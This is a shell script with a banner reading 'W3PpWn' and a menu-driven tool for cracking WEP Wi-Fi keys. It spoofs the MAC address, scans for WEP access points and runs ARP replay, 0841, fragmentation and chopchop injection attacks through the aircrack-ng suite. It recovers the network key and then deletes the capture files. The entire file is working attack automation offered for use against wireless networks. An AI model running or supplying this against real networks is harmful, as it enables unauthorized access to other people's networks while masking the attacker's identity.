#!/bin/sh
macspoof() {
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo -n "Please Enter Mac Address You Would Like To Spoof: "
read spoof
ifconfig $DEVICE down
macchanger -m $spoof $DEVICE
clear 
ifconfig  $DEVICE up
echo "Your New Mac Address is $spoof"
} 

korekchopchop() { 
clear
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo "Spoofing Mac Address New Mac $mac"
ifconfig $DEVICE down
macchanger -m $mac $DEVICE
clear
ifconfig $DEVICE up 
echo "Scanning For Access Points"
xterm -e airodump-ng -w out --encrypt WEP $DEVICE &
sleep 10 

killall xterm 
case $OS in
   Linux) bssid=`cat out-01.csv |grep WEP |awk '{print $1} ' |cut -d "," -f 1`;;
   *) bssid="Unknown";;
esac
clear
echo $bssid
echo -n "Please Enter Bssid: "
read bss
case $OS in
   Linux) channel=`cat out-01.csv |grep "$bss" |awk '{print $6} ' |cut -d "," -f 1  `;;
   *) channel="Unknown";;
esac
airodump-ng -c $channel -w wep --ivs --bssid $bss $DEVICE &
xterm -e aireplay-ng -1 0 -a $bss -h $mac $DEVICE &
xterm -e aireplay-ng -4 -b $bss -h $mac  $DEVICE 
xterm -e packetforge-ng -0 -a $bss -h $mac -k 255.255.255.255 -l 255.255.255.255 -y replay*.xor -w /root/frag 
xterm -e aireplay-ng -2 -r frag -h $mac $DEVICE &
sleep 10 
xterm -e aircrack-ng wep*.ivs -l key 
killall xterm
killall airodump-ng 
rm out*
rm wep-0*
rm replay_*
rm frag
}

framentation() {
clear
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo "Spoofing Mac Address New Mac $mac"
ifconfig $DEVICE down
macchanger -m $mac $DEVICE
clear
ifconfig $DEVICE up 
echo "Scanning For Access Points"
xterm -e airodump-ng -w out --encrypt WEP $DEVICE &
sleep 10 

killall xterm 
case $OS in
   Linux) bssid=`cat out-01.csv |grep WEP |awk '{print $1} ' |cut -d "," -f 1`;;
   *) bssid="Unknown";;
esac
clear
echo $bssid
echo -n "Please Enter Bssid: "
read bss
case $OS in
   Linux) channel=`cat out-01.csv |grep "$bss" |awk '{print $6} ' |cut -d "," -f 1  `;;
   *) channel="Unknown";;
esac
airodump-ng -c $channel -w wep --ivs --bssid $bss $DEVICE &
xterm  -e aireplay-ng -1 0 -a $bss -h $mac $DEVICE &
xterm  -e aireplay-ng -5 -b $bss -h $mac  $DEVICE 
xterm  -e packetforge-ng -0 -a $bss -h $mac -k 255.255.255.255 -l 255.255.255.255 -y fragment*.xor -w frag 
xterm  -e aireplay-ng -2 -r frag -h $mac $DEVICE
sleep 10 
xterm -e aircrack-ng wep*.ivs -l key 
killall xterm
killall airodump-ng 
rm out*
rm wep-0*
rm replay_*
rm frag
}

injectiontest() {
clear
OS=`uname`
IO="" 
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
aireplay-ng -9 $DEVICE
}

client0841() {
clear
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo "Spoofing Mac Address New Mac $mac"
ifconfig $DEVICE down
macchanger -m $mac $DEVICE
clear
ifconfig $DEVICE up 
echo "Scanning For Access Points"
xterm -e airodump-ng -w out --encrypt WEP $DEVICE &
sleep 10 

killall xterm 
case $OS in
   Linux) bssid=`cat out-01.csv |grep WEP |awk '{print $1} ' |cut -d "," -f 1`;;
   *) bssid="Unknown";;
esac
clear
echo $bssid
echo -n "Please Enter Bssid: "
read bss
case $OS in
   Linux) channel=`cat out-01.csv |grep "$bss" |awk '{print $6} ' |cut -d "," -f 1  `;;
   *) channel="Unknown";;
esac
airodump-ng -c $channel -w wep --ivs --bssid $bss $DEVICE &
xterm -e aireplay-ng -1 0 -a $bss -h $mac $DEVICE &
xterm -e aireplay-ng -2 -b $bss -t 1 -d FF:FF:FF:FF:FF:FF  -h $mac $DEVICE.&
sleep 10 
xterm -e aircrack-ng wep*.ivs -l key 
killall xterm
killall airodump-ng
rm out* 
rm wep-0*
rm replay_*
}



arpreplay() { 
clear
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo "Spoofing Mac Address New Mac $mac"
ifconfig $DEVICE down
macchanger -m $mac $DEVICE
clear
ifconfig $DEVICE up 
echo "Scanning For Access Points"
xterm -e airodump-ng -w out --encrypt WEP $DEVICE &
sleep 10 

killall xterm 
case $OS in
   Linux) bssid=`cat out-01.csv |grep WEP |awk '{print $1} ' |cut -d "," -f 1`;;
   *) bssid="Unknown";;
esac
clear
echo $bssid
echo -n "Please Enter Bssid: "
read bss
case $OS in
   Linux) channel=`cat out-01.csv |grep "$bss" |awk '{print $6} ' |cut -d "," -f 1  `;;
   *) channel="Unknown";;
esac
airodump-ng -c $channel -w wep --ivs --bssid $bss $DEVICE &
xterm -e aireplay-ng -1 0 -a $bss -h $mac $DEVICE &
xterm -e aireplay-ng -3 -b $bss -h $mac $DEVICE &
sleep 10 
xterm -e aircrack-ng wep*.ivs -l key 
killall xterm
killall airodump-ng 
rm out*
rm wep-0*
rm replay_*
}

menu1() {
   clear
tput setaf 9; cat << EOF
888       888  .d8888b.  8888888b.           888       888         
888   o   888 d88P  Y88b 888   Y88b          888   o   888         
888  d8b  888      .d88P 888    888          888  d8b  888         
888 d888b 888     8888"  888   d88P 88888b.  888 d888b 888 88888b. 
888d88888b888      "Y8b. 8888888P"  888 "88b 888d88888b888 888 "88b
88888P Y88888 888    888 888        888  888 88888P Y88888 888  888
8888P   Y8888 Y88b  d88P 888        888 d88P 8888P   Y8888 888  888
888P     Y888  "Y8888P"  888        88888P"  888P     Y888 888  888
                                    888                             
                                    888                             
                                    888                             
            
EOF
   
echo "   Please Select A Type Of Attack"
echo
echo "      1. Client Based Arp Replay"
echo "      2. Client Based 0841"
echo "      3. Clientless Fragmentation"
echo "      4. Clientless Korek Chop Chop"
echo "      5  Injection Test"
echo "      6. Spoof Mac Address"
echo "      7. Exit"
echo
echo -n "     LAK>"
}
menu2() {

   while true
   do
   menu1
   read answer
   case $answer in
   1)
      arpreplay
  ;;   
   2)
      client0841
  ;;
   3)
      framentation
  ;;
   4)
      korekchopchop  
  ;;
   5)
      injectiontest
  ;;
   6)
    macspoof
  ;;
   7)
    exit
  ;;
   *)
     menu2
  ;;
   esac
   done
}

case "$1" in
    help)
   menu2
  ;;     

    *)
   menu2
  ;;
esac
